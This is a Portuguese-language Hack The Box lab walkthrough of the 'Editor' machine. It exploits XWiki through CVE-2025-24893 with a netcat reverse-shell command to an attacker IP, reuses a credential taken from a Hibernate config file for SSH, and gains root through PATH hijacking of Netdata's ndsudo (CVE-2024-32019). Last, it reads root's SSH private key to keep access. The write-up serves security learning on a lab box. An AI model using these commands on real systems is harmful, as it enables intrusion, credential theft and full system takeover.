---
title: "Hack The Box - Editor"
author: "imendes"
date: 2026-01-18
subject: "HTB Walkthrough"
description: "Walkthrough da máquina Editor (HTB), explorando execução remota de código no XWiki via injeção de Groovy (CVE-2025-24893) e posterior escalada de privilégios por meio de falhas no Netdata (ndsudo)."
keywords: ["HTB", "Editor", "XWiki", "CVE-2025-24893", "Groovy RCE", "netdata", "ndsudo", "CVE-2024-32019", "privilege escalation"]
lang: pt-BR
titlepage: true
titlepage-color: "483D8B"
titlepage-text-color: "FFFAFA"
titlepage-rule-color: "FFFAFA"
titlepage-rule-height: 2
book: true
classoption: oneside
code-block-font-size: \scriptsize
categories: [Hack The Box Machines, Linux, Easy]
---

## Introdução

Este relatório documenta o processo de exploração da máquina **Editor** da plataforma **Hack The Box**.  
A máquina apresenta uma instância do **XWiki** executando na porta 8080, afetada pela vulnerabilidade **CVE-2025-24893**, que permite execução remota de código através de injeção de código Groovy. Após obter acesso inicial, a escalada de privilégios foi realizada explorando credenciais vazadas em arquivos de configuração e, posteriormente, através da vulnerabilidade **CVE-2024-32019** no binário `ndsudo` do Netdata.  
O objetivo foi obter acesso inicial via exploração da vulnerabilidade XWiki e, em seguida, realizar a **escalada de privilégios** até o usuário root através de manipulação de PATH e execução privilegiada.

## Metodologia

A metodologia aplicada seguiu as seguintes fases:

- **Coleta de informações** – identificação de portas e serviços expostos via Nmap.  
- **Enumeração** – análise da versão do XWiki e identificação de vulnerabilidades conhecidas.  
- **Exploração** – execução remota de código via CVE-2025-24893 (Groovy RCE).  
- **Manutenção de acesso** – obtenção de credenciais SSH através de arquivos de configuração vazados.  
- **Escalada de privilégios** – exploração da CVE-2024-32019 no binário `ndsudo` para obter acesso root.

## Coleta de Informações

### Varredura Nmap

Comando: `sudo nmap -sV -sC -sS -Pn editor.htb`
```sh
# Nmap 7.94SVN scan initiated Sun Nov 17 11:13:14 2025 as: nmap -sV -sC -oA nmap 10.10.11.80
Nmap scan report for 10.10.11.80
Host is up (0.80s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editor.htb/
8080/tcp open  http    Jetty 10.0.20
|_http-server-header: Jetty(10.0.20)
| http-cookie-flags:
|   /:
|     JSESSIONID:
|_      httponly flag not set
| http-methods:
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
| http-robots.txt: 50 disallowed entries
| http-title: XWiki - Main - Intro
|_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Serviços identificados:**

| Porta    | Serviço | Versão                | Observação                           |
| :------- | :------ | :-------------------- | :----------------------------------- |
| 22/tcp   | SSH     | OpenSSH 8.9p1 Ubuntu  | Acesso remoto                        |
| 80/tcp   | HTTP    | nginx 1.18.0          | Redirecionamento para editor.htb     |
| 8080/tcp | HTTP    | Jetty 10.0.20         | Aplicação XWiki vulnerável           |

### Enumeração de Serviços

Durante a análise da aplicação web na porta **8080**, foi identificada uma instância do **XWiki** em execução. A verificação da versão revelou informações críticas sobre a aplicação.

A versão identificada do XWiki (`15.10.8`) é vulnerável à **CVE-2025-24893**, que permite a execução remota de código através de injeção de código **Groovy**. Esta vulnerabilidade explora a capacidade de processar templates Velocity sem sanitização adequada, permitindo que atacantes executem código arbitrário no contexto da aplicação.

## Exploração

### Execução Remota de Código via XWiki

A exploração foi realizada utilizando a vulnerabilidade **CVE-2025-24893**, que permite injeção e execução de código Groovy no XWiki.

#### Payload e Exploração

Foi utilizada a seguinte PoC disponível publicamente:

**Repositório:** [https://github.com/gunzf0x/CVE-2025-24893](https://github.com/gunzf0x/CVE-2025-24893)

Uso do exploit:

```bash
python3 CVE-2025-24893.py -t 'http://10.10.11.80:8080' -c 'busybox nc 10.10.16.2 4444 -e /bin/bash'
```

O payload estabeleceu um **reverse shell** conectado ao atacante, obtendo acesso inicial como usuário **xwiki**.

Shell estabilizado:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

### Enumeração Pós-Exploração

Após obter acesso como usuário `xwiki`, foi identificado que este usuário possui privilégios limitados. A enumeração do sistema revelou a existência de apenas um usuário regular: **oliver**.

Durante a investigação dos arquivos de configuração do XWiki, foi descoberta uma credencial vazada no arquivo de configuração do Hibernate:

```bash
xwiki@editor:/etc/xwiki$ grep -IR password . 2>/dev/null
./hibernate.cfg.xml:    <property name="hibernate.connection.password">{{PASSWD}}</property>
```

### Manutenção de Acesso

A senha encontrada foi testada para reutilização com o usuário **oliver**, resultando em autenticação bem-sucedida:

```bash
ssh oliver@10.10.11.80
```

Com o acesso estabelecido como usuário oliver, a flag de usuário foi recuperada:

```bash
oliver@editor:~$ cat user.txt
```

## Escalada de Privilégios

### Enumeração de Grupos e Serviços

Verificando os grupos do usuário oliver:

```bash
oliver@editor:~$ id
uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)
```

O usuário pertence ao grupo **netdata**, o que motivou uma investigação mais aprofundada sobre serviços relacionados.

### Descoberta de Serviços Internos

Listando portas abertas no sistema:

```bash
oliver@editor:~$ ss -tunl
Netid      State       Recv-Q       Send-Q                  Local Address:Port              Peer Address:Port      Process
tcp        LISTEN      0            4096                        127.0.0.1:19999                  0.0.0.0:*
tcp        LISTEN      0            70                          127.0.0.1:33060                  0.0.0.0:*
tcp        LISTEN      0            151                         127.0.0.1:3306                   0.0.0.0:*
tcp        LISTEN      0            511                           0.0.0.0:80                     0.0.0.0:*
tcp        LISTEN      0            128                           0.0.0.0:22                     0.0.0.0:*
tcp        LISTEN      0            50                                  *:8080                         *:*
```

A porta **19999** foi identificada como serviço interno. Esta porta corresponde ao dashboard web do **Netdata**, um sistema de monitoramento de desempenho em tempo real.

### Tunelamento SSH e Acesso ao Dashboard

Para acessar o serviço Netdata, foi estabelecido um túnel SSH:

```bash
ssh oliver@10.10.11.80 -L 19999:127.0.0.1:19999
```

O dashboard Netdata foi acessado através de `http://127.0.0.1:19999`, revelando informações sobre o sistema monitorado.

### Análise do Daemon Netdata

A análise do dashboard motivou a investigação dos processos e configurações do Netdata. Foi verificado o status do serviço:

```bash
oliver@editor:~$ systemctl status netdata
● netdata.service - Real time performance monitoring
     Loaded: loaded (/lib/systemd/system/netdata.service; enabled; vendor preset: enabled)
     Active: active (running) since Mon 2025-11-17 10:00:41 UTC; 13h ago
    Process: 1039 ExecStartPre=/bin/mkdir -p /opt/netdata/var/cache/netdata (code=exited, status=0/SUCCESS)
    Process: 1074 ExecStartPre=/bin/chown -R netdata /opt/netdata/var/cache/netdata (code=exited, status=0/SUCCESS)
   Main PID: 1107
      Tasks: 87 (limit: 4558)
     Memory: 192.3M
     CGroup: /system.slice/netdata.service
             ├─  1107 /opt/netdata/bin/srv/netdata -P /run/netdata/netdata.pid -D -i 127.0.0.1
             ├─  1139 /opt/netdata/bin/srv/netdata --special-spawn-server
             ├─  1447 /opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin 1
             └─384071 bash /opt/netdata/usr/libexec/netdata/plugins.d/tc-qos-helper.sh 1
```

Este output revelou o diretório de plugins do Netdata: `/opt/netdata/usr/libexec/netdata/plugins.d/`

### Descoberta do Binário ndsudo

Investigando o diretório de plugins:

```bash
oliver@editor:~$ ls -l /opt/netdata/usr/libexec/netdata/plugins.d/
total 81420
-rwxr-xr-x 1 root root     55496 Apr  1  2024 apps.plugin
-rwxr-xr-x 1 root root     35008 Apr  1  2024 cgroup-network
-rwxr-xr-x 1 root root     30896 Apr  1  2024 debugfs.plugin
-rwxr-xr-x 1 root root   6234064 Apr  1  2024 ebpf.plugin
-rwxr-xr-x 1 root root  72593392 Apr  1  2024 go.d.plugin
-rwsr-x--- 1 root netdata   200576 Apr  1  2024 ndsudo
-rwxr-xr-x 1 root root     35008 Apr  1  2024 network-viewer.plugin
-rwxr-xr-x 1 root root     18672 Apr  1  2024 nfacct.plugin
```

O binário **ndsudo** possui permissões SUID e é executável para membros do grupo **netdata**, ao qual o usuário oliver pertence.

### Identificação da Vulnerabilidade CVE-2024-32019

O binário `ndsudo` é afetado pela **CVE-2024-32019**, que permite escalada de privilégios através de manipulação da variável de ambiente PATH. Esta vulnerabilidade ocorre porque o `ndsudo` executa comandos privilegiados buscando executáveis no PATH do sistema sem validação adequada.

Verificando os comandos suportados pelo ndsudo:

```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo -h

ndsudo

(C) Netdata Inc.

A helper to allow Netdata run privileged commands.

  --test
    print the generated command that will be run, without running it.

  --help
    print this message.

The following commands are supported:

- Command    : nvme-list
  Executables: nvme
  Parameters : list --output-format=json

[...]

The program searches for executables in the system path.
```

### Exploração da CVE-2024-32019

A exploração consiste em inserir um diretório controlável pelo atacante no início da variável PATH, criar um executável malicioso com o mesmo nome de um comando legítimo usado pelo ndsudo e, finalmente, executar o comando através do ndsudo.

#### Preparação do Ambiente

Modificando a variável PATH para priorizar o diretório home do usuário:

```bash
oliver@editor:~$ export PATH=/home/oliver:$PATH
```

#### Criação do Payload

Criando um script Python que spawna um shell com privilégios elevados:

```python
#!/usr/bin/env python3
import os
os.execl("/bin/sh", "sh", "-p")
```

Salvando o script como `/home/oliver/nvme` e tornando-o executável:

```bash
oliver@editor:~$ chmod +x /home/oliver/nvme
```

#### Execução e Obtenção de Root

Executando o comando através do ndsudo:

```bash
oliver@editor:~$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
# id
uid=1000(oliver) gid=1000(oliver) euid=0(root) groups=1000(oliver),999(netdata)
```

O shell foi obtido com **euid=0**, permitindo acesso completo ao sistema como root.

#### Recuperação da Flag Root

```bash
# ls /root/
root.txt  scripts  snap
# cat /root/root.txt
{{ROOT_FLAG}}
```

### Estabelecimento de Acesso Persistente

Para manter acesso root estável, a chave privada SSH do root foi extraída:

```bash
# ls /root/.ssh
authorized_keys  id_rsa  id_rsa.pub
# cat /root/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
{{PRIVATE_KEY}}
-----END OPENSSH PRIVATE KEY-----
```

Com a chave privada, é possível estabelecer acesso SSH direto como root:

```bash
ssh -i root_key root@10.10.11.80
```

---

**Resumo técnico:**

| Etapa          | Vetor de Ataque                        | Resultado       |
| :------------- | :------------------------------------- | :-------------- |
| Acesso inicial | CVE-2025-24893 em XWiki (Groovy RCE)   | Shell como xwiki|
| Lateral        | Credenciais vazadas em hibernate.cfg.xml | SSH como oliver |
| Escalada       | CVE-2024-32019 em ndsudo via PATH hijacking | Root shell   |

## Referências

- [CVE-2025-24893 PoC - XWiki Groovy RCE](https://github.com/gunzf0x/CVE-2025-24893)
- [CVE-2024-32019 - Netdata ndsudo Privilege Escalation](https://nvd.nist.gov/vuln/detail/CVE-2024-32019)
- [Netdata Security Advisory](https://github.com/netdata/netdata/security/advisories)
